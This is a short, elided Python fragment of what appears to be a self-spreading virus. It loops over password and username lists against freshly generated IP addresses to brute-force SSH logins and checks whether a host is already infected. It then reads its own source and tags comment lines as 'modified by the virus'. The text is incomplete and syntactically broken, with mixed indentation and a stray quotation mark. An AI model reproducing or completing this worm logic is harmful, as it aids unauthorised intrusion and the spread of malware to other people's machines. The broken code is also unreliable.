    ...
    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                # For each ip, username,password that matches with the
                # target we try to build a ssh connection
                try:
                    ...
                    # Checking target host was infected previously
		    ...
		    with open(__file__,"r") as f:
    		    	for line in f:
		    		if(line.startswith("#")):
	 		    		line = line.strip() + "\t ** comments are modified by the virus **\n""
					content.append(line)
					continue    
 				content.append(line)
